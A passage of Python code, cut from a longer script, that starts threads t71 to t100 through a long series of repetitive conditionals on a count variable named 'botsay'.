if botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t71.start()
if botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t72.start()
if botsay == 73 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t73.start()
if botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t74.start()
if botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t75.start()
if botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t76.start()
if botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t77.start()
if botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t78.start()
if botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t79.start()
if botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t80.start()
if botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t81.start()
if botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t82.start()
if botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t83.start()
if botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t84.start()
if botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t85.start()
if botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t86.start()
if botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t87.start()
if botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t88.start()
if botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t89.start()
if botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t90.start()
if botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t91.start()
if botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t92.start()
if botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t93.start()
if botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t94.start()
if botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t95.start()
if botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t96.start()
if botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t97.start()
if botsay == 98 or botsay == 99 or botsay == 100:
    t98.start()
if botsay == 99 or botsay == 100:
    t99.start()
if botsay == 100:
    t100.start()    
